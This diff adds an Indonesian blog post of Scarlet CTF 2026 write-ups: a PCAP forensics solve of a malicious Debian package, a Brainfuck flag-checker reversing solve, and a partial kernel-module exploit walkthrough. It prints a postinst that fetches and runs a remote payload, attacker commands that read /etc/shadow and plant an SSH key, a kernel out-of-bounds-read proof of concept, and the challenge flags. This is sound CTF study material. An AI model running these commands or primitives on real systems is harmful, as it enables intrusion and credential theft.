@@ -1,0 +1,1750 @@
+---
+layout: post
+title: "Scarlet CTF 2026"
+date: 2026-01-11
+image: /assets/.
+categories: ["Scarlet"]
+tags: [forensic, web, rev, pwn,ctf2026]
+---
+
+## Advance Packaged Threat — Forensics
+
+### Intro
+
+Awalnya kelihatannya cuma “drama admin biasa”: dulu pernah nambah repo/“PPA” custom buat library yang sudah lama mati, terus lupa dibersihin. Tapi pagi ini ada yang bikin merinding: **muncul SSH public key asing di `/root/.ssh/authorized_keys`**.
+
+Yang kita punya cuma satu artefak: `intercept.pcapng`. Jadi write-up ini aku tulis investigasi—dari recon traffic, nyeret benang “repo APT aneh”, sampai ngebuka lapisan payload-nya dan akhirnya **ngeliat perintah attacker** yang menulis `authorized_keys` dan nge-base64 flag.
+
+
+---
+
+### Recon: apa aja yang lewat di PCAP?
+
+Pertama, cek metadata capture:
+
+```bash
+capinfos intercept.pcapng
+```
+
+Terus aku cari gambaran protokolnya:
+
+```bash
+tshark -r intercept.pcapng -q -z io,phs
+tshark -r intercept.pcapng -q -z conv,ip
+tshark -r intercept.pcapng -q -z conv,tcp
+```
+
+Yang langsung “nyantol”:
+
+- Ada HTTP besar-besaran (APT update / download paket).
+- Ada koneksi `172.22.0.2 -> 172.22.0.3:80` dengan `Host: knowledge-universal` (ini bau repo internal/rogue mirror).
+- Ada koneksi ke `:21` (FTP)… tapi isinya kayak noise (indikasi encrypted / custom protocol yang disamarkan).
+
+Listing request HTTP-nya biar jelas:
+
+```bash
+tshark -r intercept.pcapng -Y http.request \
+  -T fields -E header=y -E separator='\t' \
+  -e frame.time -e ip.src -e ip.dst -e http.host -e http.user_agent -e http.request.uri
+```
+
+Kelihatan dua “persona”:
+
+- `Debian APT-HTTP/1.3 ...` ambil `.../repo/...` dari `knowledge-universal`
+- `curl/7.88.1` ambil `/symbols.zip` dan `/authorization` dari host yang sama
+
+Ini penting: APT yang mulai, tapi **`curl` yang mengunci rencana**.
+
+---
+
+### Mengambil “bukti fisik” dari HTTP: export objects
+
+Daripada cuma lihat request, aku export semua objek HTTP dari PCAP:
+
+```bash
+mkdir -p exported
+tshark -r intercept.pcapng --export-objects http,exported
+ls -la exported
+```
+
+Dari folder `exported/`, dua file paling mencurigakan:
+
+- `exported/cmdtest.deb` (paket Debian yang diambil dari repo `knowledge-universal`)
+- `exported/authorization` (ternyata SSH public key)
+
+Cek `authorization`:
+
+```bash
+file exported/authorization
+cat exported/authorization
+```
+
+Isinya:
+
+```text
+ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHHb4NC8X/lhXcjcL1Hr/YkPz1GkXYebLZgamO4A9pq2 root@skibidi_toilet_fan
+```
+
+Ini *smoking gun* bahwa attacker memang menyiapkan key untuk masuk sebagai root.
+
+---
+
+### “Exploit”-nya attacker: paket `.deb` dengan `postinst` nakal
+
+Sekarang fokus ke `cmdtest.deb`. Aku bongkar control scripts-nya:
+
+```bash
+dpkg-deb -I exported/cmdtest.deb
+dpkg-deb -e exported/cmdtest.deb extracted/cmdtest/control
+sed -n '1,200p' extracted/cmdtest/control/postinst
+```
+
+Isi `postinst` singkat tapi brutal:
+
+```bash
+curl -s http://knowledge-universal/symbols.zip -o symbols.zip
+unzip -q -P very-normal-very-cool symbols.zip
+bash ./disk_cleanup
+```
+
+Jadi alur komprominya kira-kira gini:
+
+1. Server melakukan `apt update` / `apt install` (mungkin otomatis / cron).
+2. Dari repo `knowledge-universal`, terdownload `cmdtest.deb`.
+3. Saat install, `postinst` jalan sebagai root → download `symbols.zip` → jalankan `disk_cleanup`.
+
+Repo “PPA” yang kamu lupa itulah pintu masuknya.
+
+---
+
+### Lapisan 2: `disk_cleanup` yang sengaja bikin pusing
+
+Aku unzip `symbols.zip` dengan password dari `postinst`:
+
+```bash
+unzip -P very-normal-very-cool -p exported/symbols.zip disk_cleanup > extracted/disk_cleanup.sh
+wc -c extracted/disk_cleanup.sh
+```
+
+Isinya bukan bash normal—lebih mirip “ASCII salad” yang ujungnya decode payload. Trik cepatnya: cari blob Base64 `H4sI...` (gzip), decode, lalu lihat hasilnya.
+
+Contoh decode (yang aku pakai waktu analisis):
+
+```bash
+python3 - <<'PY'
+import re,base64,gzip
+p=open('extracted/disk_cleanup.sh','r',encoding='utf-8',errors='replace').read()
+m=re.search(r"'(H4sI[^']+)'", p)
+raw=base64.b64decode(m.group(1))
+stage=gzip.decompress(raw)
+open('extracted/disk_cleanup.decoded','wb').write(stage)
+print(stage[:200].decode('utf-8','replace'))
+PY
+```
+
+Hasil decode itu masih obfuscated lagi, tapi kali ini kelihatan ada Base64 panjang. Yang menarik: setelah dicoba, Base64-nya perlu **dibalik (reverse)** dulu baru jadi script yang waras.
+
+Output finalnya aku simpan sebagai `extracted/stage2.sh` (hasilnya intinya seperti ini):
+
+- Ambil “payload gzip” dari file aneh di `yarnlib/_`
+- Append 10 byte ekstra (buat benerin gzip yang sengaja dipotong)
+- `gunzip` jadi binary ELF
+- Eksekusi binary itu untuk konek ke C2
+
+Di dalam `stage2.sh`, IP dan port juga disamarkan pakai matematika:
+
+- IP hasil evaluasi: `172.18.0.1`
+- Port hasil evaluasi: `21`
+
+Di PCAP, koneksinya terlihat menuju `172.17.0.1:21` (masih satu “zona” internal; beda subnet ini lazim kalau lingkungannya container/bridge).
+
+---
+
+### Lapisan 3: payload ELF dari gzip “sengaja rusak”
+
+Di data paket `.deb`, ada file yang kelihatannya “cuma underscore”:
+
+```bash
+dpkg-deb -x exported/cmdtest.deb extracted/cmdtest/data
+file extracted/cmdtest/data/usr/lib/python3/dist-packages/yarnlib/_
+```
+
+Itu `gzip` yang *unexpected EOF* (dipotong). `stage2.sh` memperbaikinya dengan `printf ... >> file`.
+
+Aku replikasi proses itu untuk dapat binary-nya:
+
+```bash
+mkdir -p extracted/stage3
+cp extracted/cmdtest/data/usr/lib/python3/dist-packages/yarnlib/_ extracted/stage3/payload.gz
+printf '\xff\x0f4\xbe\x47\xaf\x58\xba\x11\x00' >> extracted/stage3/payload.gz
+gunzip -c extracted/stage3/payload.gz > extracted/stage3/payload
+file extracted/stage3/payload
+```
+
+Hasilnya ELF 64-bit. `strings`-nya ngasih petunjuk kalau ini program Rust dan ada argumen `--master`:
+
+```bash
+strings -a extracted/stage3/payload | rg -n 'linux-wifi-utility|master|MASTER2\\.1\\.2' | head
+```
+
+Dan yang paling penting: binary ini menyembunyikan sesi “FTP” dalam bentuk **stream cipher**.
+
+---
+
+### Mini-RE: key stream cipher ada di `.rodata`
+
+Aku ambil 32 byte yang keliatan seperti key dari `.rodata`:
+
+```bash
+xxd -s 0xb7030 -l 32 extracted/stage3/payload
+```
+
+```text
+000b7030: facd f745 8d84 83b2 1419 7a72 45aa d45c  ...E......zrE..\
+000b7040: 4ff2 97e4 b902 9302 7234 e3c3 5dea 9069  O.......r4..]..i
+```
+
+Key (hex, 32-byte):
+
+```text
+facdf7458d8483b214197a7245aad45c4ff297e4b90293027234e3c35dea9069
+```
+
+Nonce-nya dibangun di fungsi utama:
+
+- `wifi_utility::main` di `0x00011ec0`
+- Ada immediate string yang membentuk `meow-warez:3`:
+
+```text
+0x00011fe4: movabs rax, 0x7261772d776f656d  ; "meow-war"
+0x00011ff6: mov dword [rsp+...], 0x333a7a65 ; "ez:3"
+```
+
+Gabung → `meow-warez:3`
+
+Secara konsep:
+
+```c
+// wifi_utility::main @ 0x11ec0
+key   = *(u8[32]*)0x000b7030;
+nonce = "meow-warez:3";
+
+conn = TcpStream::connect(master_addr);   // arg --master / positional
+state = ChaCha20(key, nonce);
+
+while (recv(ciphertext_chunk)) {
+    plaintext = state.xor_keystream(ciphertext_chunk); // stream berlanjut
+    if (plaintext is command) {
+        output = sh("-c", plaintext);
+        send(state.xor_keystream(output));
+    }
+}
+```
+
+---
+
+### Forensics yang “jadi exploit”: decrypt session dan baca flag
+
+Kenapa `tshark -Y ftp` keliatan garbage? Karena itu bukan FTP beneran—cuma lewat port 21.
+
+Langkahnya:
+
+1. Ambil raw bytes dari stream TCP port 21 (di PCAP ini stream id-nya `17`)
+2. Decrypt pakai ChaCha20 dengan key+nonce yang kita temuin
+
+Export follow stream raw:
+
+```bash
+tshark -r intercept.pcapng -q -z follow,tcp,raw,17 > extracted/tcp17_follow_raw.txt
+```
+
+Terus decrypt:
+
+```bash
+python3 - <<'PY'
+import re,base64
+from pathlib import Path
+from Crypto.Cipher import ChaCha20
+
+# parse output follow,tcp,raw → gabungkan sesuai arah (client/server)
+lines = Path('extracted/tcp17_follow_raw.txt').read_text().splitlines()
+chunks = []
+expect = None
+buf = bytearray()
+dst = None
+
+def push():
+    global expect, buf, dst
+    chunks.append((dst, bytes(buf)))
+    expect = None
+    buf = bytearray()
+
+for line in lines:
+    if line.startswith(('====','Follow:','Filter:','Node ')) or not line.strip():
+        continue
+    s = line.strip()
+    if expect is not None:
+        if expect == 0:
+            push()
+            continue
+        if re.fullmatch(r'[0-9a-fA-F]+', s):
+            buf.extend(bytes.fromhex(s))
+            if len(buf) == expect:
+                push()
+        continue
+    if re.fullmatch(r'[0-9a-fA-F]{8}', s):
+        dst = 'c2s' if line.startswith('\t') else 's2c'
+        expect = int(s, 16)
+        buf = bytearray()
+        if expect == 0:
+            push()
+
+key = bytes.fromhex('facdf7458d8483b214197a7245aad45c4ff297e4b90293027234e3c35dea9069')
+nonce = b'meow-warez:3'
+
+c = ChaCha20.new(key=key, nonce=nonce)
+for d, ct in chunks:
+    pt = c.decrypt(ct)
+    if pt:
+        print(pt.decode('utf-8','replace'), end='')
+PY
+```
+
+Output-nya langsung ngaku dosa. Attacker jalanin perintah seperti:
+
+```text
+id
+pwd
+cat /etc/shadow
+curl http://knowledge-universal/authorization -o /root/.ssh/authorized_keys
+ls -laR /root
+md5sum /root/.ssh/authorized_keys
+base64 /root/flag.txt
+```
+
+Dan respons `base64 /root/flag.txt` berisi:
+
+```text
+UlVTRUN7a24wY2tfa24wY2tfeW91X2g0dmVfYV9wNGNrNGdlX2luX3RoM19tNDFsfQo=
+```
+
+Decode:
+
+```bash
+echo 'UlVTRUN7a24wY2tfa24wY2tfeW91X2g0dmVfYV9wNGNrNGdlX2luX3RoM19tNDFsfQo=' | base64 -d
+```
+
+### Flag
+
+`RUSEC{kn0ck_kn0ck_you_h4ve_a_p4ck4ge_in_th3_m41l}`
+
+---
+
+## Brainfuck Flag Checker — REV
+
+### Intro
+
+Ada dua jenis “flag checker” di CTF: yang terang-terangan, dan yang ngajak kamu nyasar dulu biar seru. Challenge ini jelas tipe kedua: logic validasinya bukan di C, bukan di ASM, tapi **Brainfuck** (`program.txt`) yang panjangnya absurd dan kelihatan seperti karpet ASCII.
+
+Write-up ini aku ceritain dari **recon → ngerti perilaku input/output → bongkar pola validasi → ambil flag**. 
+
+---
+
+### Recon: “file-nya cuma satu, serius?”
+
+Pertama-tama lihat isi folder:
+
+```bash
+$ ls -la
+program.txt
+```
+
+`program.txt` isinya Brainfuck murni. Karena ngulik BF pakai mata itu sadis, aku mulai dari “bikin dia ngomong” dulu.
+
+Aku buat runner kecil (`src/checker.c`) yang nge-load `program.txt` dan menjalankan VM Brainfuck:
+
+```c
+#include <errno.h>
+#include <stdint.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+
+enum {
+  TAPE_SIZE = 8192,
+  STEP_LIMIT = 600000000ULL,
+};
+
+static void die(const char *msg) {
+  fprintf(stderr, "error: %s\n", msg);
+  exit(1);
+}
+
+static void *xmalloc(size_t n) {
+  void *p = malloc(n);
+  if (!p) die("out of memory");
+  return p;
+}
+
+static char *read_entire_file(const char *path, size_t *out_len) {
+  FILE *f = fopen(path, "rb");
+  if (!f) {
+    fprintf(stderr, "error: open %s: %s\n", path, strerror(errno));
+    exit(1);
+  }
+
+  if (fseek(f, 0, SEEK_END) != 0) die("fseek failed");
+  long end = ftell(f);
+  if (end < 0) die("ftell failed");
+  if (fseek(f, 0, SEEK_SET) != 0) die("fseek failed");
+
+  size_t n = (size_t)end;
+  char *buf = xmalloc(n + 1);
+  size_t got = fread(buf, 1, n, f);
+  if (got != n) die("short read");
+  fclose(f);
+
+  buf[n] = '\0';
+  *out_len = n;
+  return buf;
+}
+
+static int is_bf(char c) {
+  return c == '<' || c == '>' || c == '+' || c == '-' || c == '.' || c == ',' ||
+         c == '[' || c == ']';
+}
+
+static char *filter_program(const char *src, size_t src_len, size_t *out_len) {
+  char *prog = xmalloc(src_len + 1);
+  size_t j = 0;
+  for (size_t i = 0; i < src_len; i++) {
+    if (is_bf(src[i])) prog[j++] = src[i];
+  }
+  prog[j] = '\0';
+  *out_len = j;
+  return prog;
+}
+
+static int *build_jumps(const char *prog, size_t prog_len) {
+  int *jump = xmalloc(sizeof(int) * prog_len);
+  int *stack = xmalloc(sizeof(int) * prog_len);
+  int sp = 0;
+
+  for (size_t i = 0; i < prog_len; i++) jump[i] = -1;
+
+  for (size_t i = 0; i < prog_len; i++) {
+    if (prog[i] == '[') {
+      stack[sp++] = (int)i;
+    } else if (prog[i] == ']') {
+      if (sp <= 0) die("unbalanced brackets");
+      int j = stack[--sp];
+      jump[i] = j;
+      jump[j] = (int)i;
+    }
+  }
+  if (sp != 0) die("unbalanced brackets");
+
+  free(stack);
+  return jump;
+}
+
+static uint8_t *read_line_as_input(size_t *out_len) {
+  char *line = NULL;
+  size_t cap = 0;
+  ssize_t nread = getline(&line, &cap, stdin);
+  if (nread < 0) {
+    free(line);
+    line = (char *)xmalloc(1);
+    line[0] = '\0';
+    nread = 0;
+  }
+
+  while (nread > 0 && (line[nread - 1] == '\n' || line[nread - 1] == '\r')) {
+    line[--nread] = '\0';
+  }
+
+  const size_t extra = 1 + 4; // newline + padding bytes (see README)
+  uint8_t *in = xmalloc((size_t)nread + extra);
+  memcpy(in, line, (size_t)nread);
+  in[nread] = '\n';
+  memset(in + nread + 1, 0, 4);
+
+  free(line);
+  *out_len = (size_t)nread + extra;
+  return in;
+}
+
+int main(int argc, char **argv) {
+  const char *program_path = "program.txt";
+  if (argc == 3 && strcmp(argv[1], "--program") == 0) program_path = argv[2];
+  if (argc != 1 && argc != 3) {
+    fprintf(stderr, "usage: %s [--program program.txt]\n", argv[0]);
+    return 2;
+  }
+
+  size_t raw_len = 0;
+  char *raw = read_entire_file(program_path, &raw_len);
+
+  size_t prog_len = 0;
+  char *prog = filter_program(raw, raw_len, &prog_len);
+  free(raw);
+
+  int *jump = build_jumps(prog, prog_len);
+
+  fprintf(stdout, "enter flag: ");
+  fflush(stdout);
+
+  size_t in_len = 0;
+  uint8_t *in = read_line_as_input(&in_len);
+  size_t in_idx = 0;
+
+  uint8_t tape[TAPE_SIZE];
+  memset(tape, 0, sizeof(tape));
+
+  size_t ptr = 0;
+  size_t ip = 0;
+  unsigned long long steps = 0;
+
+  while (ip < prog_len) {
+    if (steps++ > STEP_LIMIT) die("step limit exceeded");
+    char c = prog[ip];
+
+    switch (c) {
+      case '>':
+        if (++ptr >= TAPE_SIZE) die("tape pointer overflow");
+        break;
+      case '<':
+        if (ptr == 0) die("tape pointer underflow");
+        ptr--;
+        break;
+      case '+':
+        tape[ptr] = (uint8_t)(tape[ptr] + 1);
+        break;
+      case '-':
+        tape[ptr] = (uint8_t)(tape[ptr] - 1);
+        break;
+      case '.':
+        putchar(tape[ptr]);
+        break;
+      case ',':
+        tape[ptr] = (in_idx < in_len) ? in[in_idx++] : 0;
+        break;
+      case '[':
+        if (tape[ptr] == 0) ip = (size_t)jump[ip];
+        break;
+      case ']':
+        if (tape[ptr] != 0) ip = (size_t)jump[ip];
+        break;
+      default:
+        break;
+    }
+
+    ip++;
+  }
+
+  free(in);
+  free(jump);
+  free(prog);
+  return 0;
+}
+```
+
+```bash
+$ make
+$ ./checker
+enter flag: test
+test^@^@^@^@
+Flag is incorrect...
+```
+
+Dari sini langsung keliatan tiga hal:
+
+1. Program **nge-echo** input kita.
+2. Ada output **NUL byte** (`^@`) nyempil sebelum newline.
+3. Ada dua ending: “incorrect” dan “correct”.
+
+Ini bukan sekadar “compare string biasa”; ini checker yang melakukan sesuatu ke input, lalu mutusin cabang.
+
+---
+
+## Mengendus panjang input: BF-nya baca “berapa byte sih?”
+
+Trik cepat: ubah panjang input dan lihat kapan output mulai aneh.
+
+```bash
+$ python3 - <<'PY'
+import subprocess
+for n in [34, 35, 36]:
+    s = "A"*n
+    out = subprocess.check_output(["./checker"], input=(s+"\n").encode())
+    print(n, out)
+PY
+```
+
+Gejalanya konsisten:
+
+- Kalau panjangnya **< 36**, kamu lihat `^@` (NUL) karena BF masih “nunggu” byte yang belum ada, lalu runner mengisi sisanya dengan 0.
+- Kalau panjangnya **≥ 36**, NUL itu hilang.
+
+Kesimpulan penting: checker ini konsepnya **fixed-length input** (tepatnya 36 byte), bukan “string sampai newline”.
+
+---
+
+### Mengubah Brainfuck jadi “logika”: cari tempat cabang
+
+Brainfuck itu “assembly versi minimalis”. Karena itu, aku memperlakukan “alamat” sebagai **instruction pointer (ip)**: indeks karakter BF setelah difilter ke `<>+-.,[]`.
+
+Yang paling berharga untuk write-up ini adalah dua ip:
+
+- `ip = 58828` → blok yang mem-print “correct”
+- `ip = 59143` → blok yang mem-print “incorrect”
+
+Kalau kamu instrument VM untuk log `ip` dan `ptr`, kamu akan lihat bahwa keputusan “benar/salah” berakhir di sekitar sini.
+
+---
+
+### Inti exploit: ternyata ini XOR checker
+
+Setelah aku dump isi tape (memori BF) di momen-momen penting, pola yang muncul rapi:
+
+- **Tape[257..292]** selalu berubah sesuai input (36 byte).
+- Ada blok 36 byte lain yang **konstan**, dan cocok sebagai “expected”.
+
+Di titik ini cara berpikirnya berubah: daripada “membaca” BF, aku biarkan BF kerja, lalu aku baca hasil kerjanya.
+
+#### Observasi kunci
+
+Untuk mode input 36 byte (tanpa newline), perubahan di tape itu 1:1:
+
+- input byte ke-`i` mempengaruhi `tape[257+i]`
+- jadi `tape[257..292]` adalah hasil transformasi input
+
+Dan ternyata transformasinya super klasik:
+
+```
+computed[i] = input[i] XOR key[i]
+```
+
+Di mana `key[i]` bisa kamu dapatkan dengan menjalankan program dengan input 36 byte nol (`0x00`), karena:
+
+```
+computed[i] = 0x00 XOR key[i] = key[i]
+```
+
+#### “Alamat” penting di tape
+
+- `computed` berada di `tape[257..292]` (36 byte)
+- `expected` berada di `tape[473..508]` (36 byte)
+
+---
+
+### Pseudocode
+
+Kalau BF-nya kita ringkas ke "bentuk manusia":
+
+```c
+// read 36 bytes
+uint8_t in[36] = read_exact(36);
+
+// key lives on tape; easiest to recover by feeding 36x 0x00
+uint8_t key[36] = {...};
+uint8_t expected[36] = {...}; // constant bytes stored in the program
+
+for (int i = 0; i < 36; i++) {
+  if ((in[i] ^ key[i]) != expected[i]) {
+    puts("Flag is incorrect...");
+    exit(0);
+  }
+}
+
+puts("Flag is correct!! :D");
+```
+
+Itu saja. Brainfuck-nya panjang karena dia “ngangkut” banyak data dan melakukan operasi copy/compare dengan cara BF.
+
+---
+
+### Exploit / Solve Script: dump tape, cari expected, recover flag
+
+Di bawah ini solver Python yang:
+
+1. Menjalankan VM Brainfuck (tanpa perlu runner eksternal).
+2. Mengambil `key = tape[257..292]` dengan input `\\x00*36`.
+3. Menjalankan input `'A'*36`, lalu mencari kemunculan kedua dari `computed` di tape untuk menemukan `expected` (kemunculan pertama adalah computed-nya sendiri di offset 257).
+4. Recover flag: `flag = expected XOR key`.
+
+```py
+#!/usr/bin/env python3
+from __future__ import annotations
+
+BF_CHARS = set("<>+-.,[]")
+
+def load_prog(path: str = "program.txt") -> str:
+    raw = open(path, "r", encoding="utf-8", errors="ignore").read()
+    return "".join(c for c in raw if c in BF_CHARS)
+
+def build_jumps(prog: str) -> list[int]:
+    jump = [-1] * len(prog)
+    st = []
+    for i, c in enumerate(prog):
+        if c == "[":
+            st.append(i)
+        elif c == "]":
+            j = st.pop()
+            jump[i] = j
+            jump[j] = i
+    return jump
+
+def run(prog: str, jump: list[int], inp: bytes, tape_size: int = 8192) -> bytearray:
+    tape = bytearray(tape_size)
+    ptr = 0
+    ip = 0
+    in_i = 0
+    while ip < len(prog):
+        c = prog[ip]
+        if c == ">":
+            ptr += 1
+        elif c == "<":
+            ptr -= 1
+        elif c == "+":
+            tape[ptr] = (tape[ptr] + 1) & 0xFF
+        elif c == "-":
+            tape[ptr] = (tape[ptr] - 1) & 0xFF
+        elif c == ".":
+            pass
+        elif c == ",":
+            tape[ptr] = inp[in_i] if in_i < len(inp) else 0
+            in_i += 1
+        elif c == "[":
+            if tape[ptr] == 0:
+                ip = jump[ip]
+        elif c == "]":
+            if tape[ptr] != 0:
+                ip = jump[ip]
+        ip += 1
+    return tape
+
+def xor(a: bytes, b: bytes) -> bytes:
+    return bytes(x ^ y for x, y in zip(a, b))
+
+def main() -> None:
+    prog = load_prog()
+    jump = build_jumps(prog)
+
+    tape0 = run(prog, jump, b"\\x00" * 36)
+    key = bytes(tape0[257:293])
+
+    tapeA = run(prog, jump, b"A" * 36)
+    computedA = bytes(tapeA[257:293])
+
+    # find expected by locating computedA elsewhere in tape (besides offset 257)
+    off = tapeA.find(computedA, 258)
+    assert off != -1, "expected block not found"
+    expected = bytes(tapeA[off : off + 36])
+
+    flag = xor(expected, key).decode("ascii")
+    print(flag)
+
+if __name__ == "__main__":
+    main()
+```
+
+Hasilnya:
+
+```
+RUSEC{g0d_im_s0_s0rry_for_th1s_p4in}
+```
+
+### Flag
+
+`RUSEC{g0d_im_s0_s0rry_for_th1s_p4in}`
+
+---
+
+## kAnticheat - PWN
+
+### Intro
+
+Waktu lihat promptnya, vibe-nya langsung kebaca: *“game dev sok jadi kernel dev”*. Kita dikasih kernel (`bzImage`), rootfs minimal, dan satu module WIP bernama `anticheat.ko`. Targetnya klasik pwn-kernel CTF: cari bug di driver/module, dapet primitive (read/write), lalu ambil flag.
+
+Write-up ini aku mulai dari recon, bongkar rootfs, baca modulnya lewat DWARF + disassembly, sampai akhirnya exploit-nya cuma… `pread()` dengan offset yang “nakal”.
+
+---
+
+### Recon: apa aja yang kita punya?
+
+Listing awal:
+
+```bash
+$ ls -la
+bzImage
+kernel_config
+rootfs.cpio.gz
+run.sh
+```
+
+Jalankan `run.sh` kelihatan ini QEMU headless dan KASLR nyala:
+
+```bash
+$ cat run.sh
+qemu-system-x86_64 \
+  -no-reboot \
+  -cpu max \
+  -net none \
+  -serial mon:stdio \
+  -display none \
+  -monitor none \
+  -vga none \
+  -kernel bzImage \
+  -initrd rootfs.cpio.gz \
+  -append "panic=-1 console=ttyS0 kaslr"
+```
+
+Unpack rootfs buat cari “attack surface”:
+
+```bash
+$ mkdir -p rootfs
+$ (cd rootfs && gzip -dc ../rootfs.cpio.gz | cpio -idmv)
+
+$ ls -la rootfs | head
+anticheat.ko
+init
+...
+```
+
+Dan `init` langsung ngaku:
+
+```bash
+$ cat rootfs/init
+...
+insmod /anticheat.ko
+exec setsid cttyhack setuidgid 100 /bin/sh ...
+```
+
+Jadi inti chall ini: module `anticheat.ko` bikin interface di `/proc/*`.
+
+---
+
+### Ngebaca modulnya: DWARF itu cheat code
+
+File `anticheat.ko` ternyata **not stripped** dan ada debug info:
+
+```bash
+$ file rootfs/anticheat.ko
+ELF 64-bit LSB relocatable ... with debug_info, not stripped
+
+$ modinfo rootfs/anticheat.ko | head
+description:    Amels-Anticheat [WIP]
+name:           amels_anticheat
+vermagic:       6.16.0 SMP preempt mod_unload
+```
+
+Karena ada DWARF, kita bisa “lihat struct” tanpa source.
+
+```bash
+$ llvm-dwarfdump --name=anticheat_blk --show-children --recurse-depth=2 rootfs/anticheat.ko
+...
+DW_TAG_structure_type "anticheat_blk" DW_AT_byte_size (0xa4)
+  member "blocking_fd"    int[20]              @ +0x00
+  member "secret_locked"  int                  @ +0x50
+  member "secret"         unsigned char[80]    @ +0x54
+```
+
+Penting banget:
+
+- `secret` ukurannya `0x50` (80 byte)
+- `secret` ada di offset `+0x54` dalam struct
+
+Ini nanti jadi “kompas” saat ngikutin pointer arithmetic di ASM.
+
+---
+
+### Peta fungsi (address / offset)
+
+Karena ini `.ko` relocatable, “address” yang kita pakai adalah **offset di section `.text`** (hasil `objdump`).
+
+```bash
+$ objdump -d -Mintel rootfs/anticheat.ko | rg -n ' <(secret_read|secret_write|get_blk_if_safe|interact_anticheat)>:'
+0000000000000060 <secret_read>:
+00000000000000f0 <secret_write>:
+00000000000005c0 <get_blk_if_safe>:
+0000000000000180 <interact_anticheat>:
+```
+
+Karakter utama kita: `get_blk_if_safe` di `0x5c0`.
+
+---
+
+### Bagian teknis: bug-nya di `get_blk_if_safe`
+
+`secret_read()` dan `secret_write()` punya pola yang sama:
+
+1) Ambil `*pos` (offset file) dan `count` (jumlah byte user minta).
+2) Panggil `get_blk_if_safe(&count, pos_ptr)` buat “validasi”.
+3) Copy data dari/ke `blk->secret + *pos`.
+
+Masalahnya: validasinya “setengah jalan”.
+
+#### `secret_read` / `secret_write` (pseudocode)
+
+Offset fungsi:
+
+- `secret_read` @ `0x0000000000000060`
+- `secret_write` @ `0x00000000000000f0`
+
+Keduanya pada dasarnya begini:
+
+```c
+// secret_read(file, user_buf, count, loff_t *pos)
+size_t n = count;
+blk = get_blk_if_safe(&n, pos);
+if (!blk) return 0;
+copy_to_user(user_buf, blk->secret + *pos, n);  // blk->secret == blk + 0x54
+*pos += n;
+return n;
+
+// secret_write(file, user_buf, count, loff_t *pos)
+size_t n = count;
+blk = get_blk_if_safe(&n, pos);
+if (!blk) return 0;
+copy_from_user(blk->secret + *pos, user_buf, n);
+*pos += n;
+return n;
+```
+
+#### Potongan ASM yang relevan
+
+Ini bagian inti `get_blk_if_safe` (offset `0x610..0x654`):
+
+```asm
+; rcx = *pos
+; rdx = count
+0x0610: mov rcx, [rbp]
+0x0614: mov rdx, [rbx]
+0x0617: lea rsi, [rcx+rdx]
+0x061b: cmp rsi, 0x50
+0x061f: ja  0x640
+
+0x0640: mov edx, 0x50
+0x0645: sub rdx, rcx        ; BUG: kalau rcx > 0x50 => underflow (unsigned)
+0x0648: mov ecx, 0x50
+0x064d: cmp rdx, rcx
+0x0650: cmova rdx, rcx      ; underflow bikin rdx "besar" => dipaksa jadi 0x50
+0x0654: mov [rbx], rdx      ; count = 0x50 (bukan error)
+```
+
+#### Pseudocode hasil “convert” dari ASM
+
+```c
+// get_blk_if_safe(size_t *count_io, loff_t *pos)
+blk = xa_find(active_anticheats, current->pid);
+if (!blk) return NULL;
+if (blk->secret_locked) return NULL;
+
+loff_t p = *pos;
+size_t n = *count_io;
+
+if ((p + n) > 0x50) {
+  // niatnya: n = min(n, 0x50 - p)
+  // realitanya: pakai unsigned math => kalau p > 0x50 terjadi underflow
+  size_t remain = (size_t)(0x50 - p);   // UNDERFLOW kalau p > 0x50
+  if (remain > 0x50) remain = 0x50;     // underflow => remain jadi 0x50
+  *count_io = remain;
+}
+
+// BUG kedua: sama sekali nggak ada check "p <= 0x50"
+return blk;
+```
+
+Kalau `*pos` lebih besar dari `0x50`, function ini **nggak nolak**. Dia malah memastikan `count` jadi `0x50`, lalu `secret_read()` akan melakukan:
+
+```c
+copy_to_user(buf, blk->secret + *pos, count);
+```
+
+Dan karena `blk->secret` ada di `blk + 0x54`, alamat efektifnya:
+
+```
+leak_addr = (blk + 0x54) + pos
+```
+
+Kalau `pos = 0x10000000`, itu udah jauh keluar dari struct → **OOB kernel read** (dan analog-nya OOB kernel write via `secret_write`).
+
+---
+
+### Eksploitasi lokal: buktikan primitive OOB read
+
+Aku bikin PoC kecil `poc_offsets.c` yang cuma:
+
+- buka `/proc/anticheat`
+- `pread(fd, buf, 0x50, off)`
+- dump hasilnya
+
+```C
+#define _GNU_SOURCE
+#include <errno.h>
+#include <fcntl.h>
+#include <inttypes.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <sys/syscall.h>
+#include <sys/types.h>
+#include <unistd.h>
+static void hexdump(const void *data, size_t len) {
+  const unsigned char *p = (const unsigned char *)data;
+  for (size_t i = 0; i < len; i++) {
+    if (i % 16 == 0)
+      printf("%04zx: ", i);
+    printf("%02x ", p[i]);
+    if (i % 16 == 15 || i + 1 == len)
+      printf("\n");
+  }
+}
+
+int main(int argc, char **argv) {
+  if (argc != 2) {
+    fprintf(stderr, "usage: %s <offset>\n", argv[0]);
+    return 2;
+  }
+
+  long long off = strtoll(argv[1], NULL, 0);
+  int fd = open("/proc/anticheat", O_RDWR);
+  if (fd < 0) {
+    perror("open(/proc/anticheat)");
+    return 1;
+  }
+
+  unsigned char buf[0x50];
+  memset(buf, 0x41, sizeof(buf));
+
+  errno = 0;
+  ssize_t r = pread(fd, buf, sizeof(buf), (off_t)off);
+  int e = errno;
+
+  printf("pread(off=%lld) -> %zd (errno=%d: %s)\n", off, r, e,
+         e ? strerror(e) : "OK");
+  hexdump(buf, sizeof(buf));
+  return 0;
+}
+```
+
+Compile:
+
+```bash
+$ gcc -O2 -static -s -o poc_offsets poc_offsets.c
+```
+
+Dan di VM:
+
+```bash
+/ $ /mnt/poc_offsets 0x1000
+pread(off=4096) -> 80
+0000: b1 4d eb ff 00 93 07 80 ...
+```
+
+Offset `0x1000` aja sudah bisa ngasih non-zero bytes (kernel memory yang bukan secret).
+
+---
+
+### Eksploitasi remote: service minta “URL ELF”
+
+Remote challenge-nya bukan shell langsung. Dia minta URL:
+
+```bash
+$ nc challs.ctf.rusec.club 47095
+Enter URL of compiled exploit:
+```
+
+Binary dari URL itu di-download, ditaruh di `/mnt/exploit`, lalu VM boot dan kita dapet shell user biasa. Jadi strategi yang paling santai:
+
+1) Compile exploit jadi 1 file ELF (lebih aman `-static`)
+2) Host binary itu di file host publik
+3) Paste URL ke service
+4) Jalankan `/mnt/exploit ...` di dalam VM remote
+
